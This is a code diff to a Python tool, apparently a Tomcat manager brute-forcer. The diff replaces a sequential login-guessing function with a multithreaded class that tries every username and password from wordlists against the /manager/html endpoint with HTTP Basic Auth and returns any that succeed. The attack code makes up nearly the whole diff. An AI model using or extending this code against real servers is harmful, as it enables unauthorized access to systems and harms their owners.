@@ -1,7 +1,7 @@
 import argparse
 import sys
 import time
-
+import concurrent.futures
 import requests
 from requests.auth import HTTPBasicAuth
 
@@ -70,48 +70,62 @@ class output_class:
 
 
 # Brute force mode function
-def brute(url: str, userlist: str, wordlist: str) -> tuple[str, str] | bool:
-    if userlist is None:
-        userlist = common_username
-    else:
-        with open(userlist, 'r') as file:
-            userlist = file.read().splitlines()
+class Brute:
+    def __init__(self, url: str, userlist: str, wordlist: str):
+        self.url = url
+        self.userlist = userlist
+        self.wordlist = wordlist
 
-    # without user list
-    with open(wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
+    def brute_worker(self, username, password):
+        auth = HTTPBasicAuth(username, password)
+        response = requests.get(f"{self.url}/manager/html", auth=auth)
+        if response.status_code == 200:
+            output.verbose(state="success", description=f"{username}:{password}", clear_previous_line=False)
+            return username, password
+        else:
+            output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
+            return None
 
-        length_wordlist = len(open_wordlist.readlines())
+    def brute(self):
+        if self.userlist is None:
+            self.userlist = common_username
+        else:
+            with open(self.userlist, 'r') as file:
+                self.userlist = file.read().splitlines()
 
-        with Progress(*progress_bar.columns, transient=True) as progress:
-            task = progress.add_task(description="[violet] Brute force...",
-                                     total=length_wordlist * len(userlist))
+        output.message(state="ongoing", description="Brute force is running...", clear_previous_line=False)
 
-            for username in userlist:
-                # Reset file pointer to the beginning
-                open_wordlist.seek(0)
+        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
+            passwords = open_wordlist.readlines()
 
-                for password in open_wordlist:
-                    password = password.strip()  # remove space or bad space
-                    auth = HTTPBasicAuth(username, password)
-                    response = requests.get(f"{url}/manager/html", auth=auth)
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            tasks = []
+            for username in self.userlist:
+                for password in passwords:
+                    password = password.strip()
+                    task = executor.submit(self.brute_worker, username, password)
+                    tasks.append(task)
 
-                    # TODO : add an option --continue-on-success
-                    if response.status_code == 200:
-                        output.verbose(state="success", description=f"{username}:{password}", clear_previous_line=False)
-                        progress.update(task, completed=length_wordlist * len(userlist))
-                        time.sleep(1)
-                        return username, password
-                    else:
-                        output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
-                        progress.advance(task)
+            credentials = []
 
-    # if not found return False statement
-    return False
+            for future in concurrent.futures.as_completed(tasks):
+                result = future.result()
+
+                if result:
+                    new_credentials = {'username': result[0], 'password': result[1]}
+                    credentials.append(new_credentials)
+
+            output.message(state="success", description="Brute force done!", clear_previous_line=True)
+
+            if credentials:
+                return credentials
+
+        return False
 
 
 def banner() -> str:
     return '''
-    
+
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
 ⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
